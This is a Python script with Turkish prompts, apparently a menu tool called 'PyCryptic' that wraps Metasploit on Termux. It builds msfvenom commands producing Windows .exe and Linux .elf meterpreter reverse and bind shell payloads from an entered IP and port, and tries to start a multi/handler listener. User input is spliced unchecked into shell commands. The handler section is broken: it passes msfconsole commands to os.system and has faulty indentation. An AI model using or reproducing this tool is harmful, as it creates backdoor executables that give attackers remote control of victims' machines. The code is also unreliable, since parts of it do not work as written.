#!usr/bin/env python
# -*- coding: utf-8 -*-

import os
from colorama import Fore, Back, Style
import pyfiglet
## İZİNLER ##
os.system("sudo apt-get install figlet toilet")
os.system("sudo apt-get install figlet boxes")
os.system("sudo apt-get install figlet lolcat")
os.system("mv msf.tar.gz $HOME")
os.system("gem install --no-document --verbose rubygems-update && update_rubygems")
os.system("gem install bundler && bundle config build.nokogiri --use-system-libraries && cd $HOME/metasploit-framework && bundle install")
os.system("cp assets/termux/msfconsole $PREFIX/bin/ && cp assets/termux/msfvenom $PREFIX/bin/")
os.system("chmod +x $PREFIX/bin/msfconsole")
os.system("chmod +x $PREFIX/bin/msfvenom")

# Başlangıç mesajları
os.system("clear")
os.system("""figlet -f slant "PyCryptic" | sed 's/^/                        /' | lolcat""")
print(Fore.LIGHTCYAN_EX + "\033[1m" + " >> Payload Generator For Metasploit" + "\033[1m")
print(Fore.LIGHTMAGENTA_EX + "\033[1m" + "       <>Created by QuirX<>" + "\033[1m")
print(Fore.LIGHTGREEN_EX + "\033[1m" + "****************************************" + "\033[1m")
print("""""")

print(Fore.LIGHTMAGENTA_EX + "\033[1m" + " [1] ✓ Payload Oluştur" + "\033[1m")
print(Fore.LIGHTGREEN_EX + "\033[1m" + " [2] ✓ Start Handler" + "\033[1m")
print(Fore.LIGHTBLUE_EX + "\033[1m" + " [3] ✓ Metasploiti Çalıştır" + "\033[1m")
print(Fore.LIGHTRED_EX + "\033[1m" + " [4] ✓ Çıkış" + "\033[1m")

islemnum = int(input(Fore.LIGHTYELLOW_EX + "İşlem Numarasını Giriniz: "))


if islemnum == 3:
    print("Çalıştırılıyor...")
    os.system("msfconsole ")




if islemnum == 1:
    print(Fore.LIGHTRED_EX + """***********************""")    
    print("\033[1m" + ">> [1] windows/meterpreter/reverse_tcp" + "\033[1m")
    print("\033[1m" + ">> [2] windows/meterpreter/reverse_http" + "\033[1m")
    print("\033[1m" + ">> [3] windows/meterpreter/bind_tcp" + "\033[1m")
    print("\033[1m" + ">> [4] linux/x86/meterpreter/bind_tcp" + "\033[1m")
    
    islem_no = int(input(Fore.LIGHTYELLOW_EX + "Opsiyon Seçin: "))
    print(Fore.LIGHTRED_EX + """***********************""")    
    
    if islem_no == 1:
        lhost = input("İp Adresinizi Giriniz: ")
        lport = input("Dinleme Yapacağınız Portu Giriniz: ")
        isim = input("Dosyanın İsmini Belirleyin: ")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe > " + isim + ".exe")
    
    elif islem_no == 2:
        lhost = input("İp Adresinizi Giriniz: ")
        lport = input("Dinleme Yapacağınız Portu Giriniz: ")
        isim = input("Dosyanın İsmini Belirleyin: ")
        os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + lhost + " LPORT=" + lport + " -f exe > " + isim + ".exe")
    
    elif islem_no == 3:
        rhost = input("Hedef İp Adresini Giriniz: ")
        lport = input("Dinleme Yapacağınız Portu Giriniz: ")
        isim = input("Dosyanın İsmini Belirleyin: ")
        os.system("msfvenom -p windows/meterpreter/bind_tcp RHOST=" + rhost + " LPORT=" + lport + " -f exe > " + isim + ".exe")        
    
    elif islem_no == 4:
        rhost = input("Hedef İp Adresini Giriniz: ")
        lport = input("Dinleme Yapacağınız Portu Giriniz: ")
        isim = input("Dosyanın İsmini Belirleyin: ")
        os.system("msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=" + rhost + " LPORT=" + lport + " -f elf > " + isim + ".elf")

      
if islemnum == 2:
 print("\033[1m" + ">> [1] windows/meterpreter/reverse_tcp" + "\033[1m")
print("\033[1m" + ">> [2] windows/meterpreter/reverse_http" + "\033[1m")
print("\033[1m" + ">> [3] windows/meterpreter/bind_tcp" + "\033[1m")
print("\033[1m" + ">> [4] linux/x86/meterpreter/bind_tcp" + "\033[1m")

print(Fore.LIGHTRED_EX + """***********************""")    
islem_iki=int(input("İşlem Seçin >>"))
if islem_iki == 1:
     lhost = input("İp Adresinizi Giriniz: ")
     lport = input("Dinleme Yapacağınız Portu Giriniz: ")
     os.system("msfconsole -q")
     os.system("use exploit/multi/handler ")
     os.system("set payload windows/meterpreter/reverse_tcp ")
     os.system("set lhost " + " " + lhost)
     os.system("set lport " + " " + lport)

if islem_iki == 2:
     lhost = input("İp Adresinizi Giriniz: ")
     lport = input("Dinleme Yapacağınız Portu Giriniz: ")
     os.system("msfconsole -q")
     os.system("use exploit/multi/handler ")
     os.system("set payload windows/meterpreter/reverse_http ")
     os.system("set lhost " + " " + lhost)
     os.system("set lport " + " " + lport)    

if islem_iki == 3:
     rhost = input("Hedef İp Adresini Giriniz: ")
     lport = input("Dinleme Yapacağınız Portu Giriniz: ")
     os.system("msfconsole -q")
     os.system("use exploit/multi/handler ")
     os.system("set payload windows/meterpreter/bind_tcp ")
     os.system("set rhost " + " " + rhost)
     os.system("set lport " + " " + lport)         

if islem_iki == 4:
     rhost = input("Hedef İp Adresini Giriniz: ")
     lport = input("Dinleme Yapacağınız Portu Giriniz: ")
     os.system("msfconsole -q")
     os.system("use exploit/multi/handler ")
     os.system("set payload linux/x86/meterpreter/bind_tcp ")
     os.system("set rhost " + " " + rhost)
     os.system("set lport " + " " + lport)   

if islemnum == 4:
    print(">> İşlem Gerçekleştiriliyor..")
    exit()




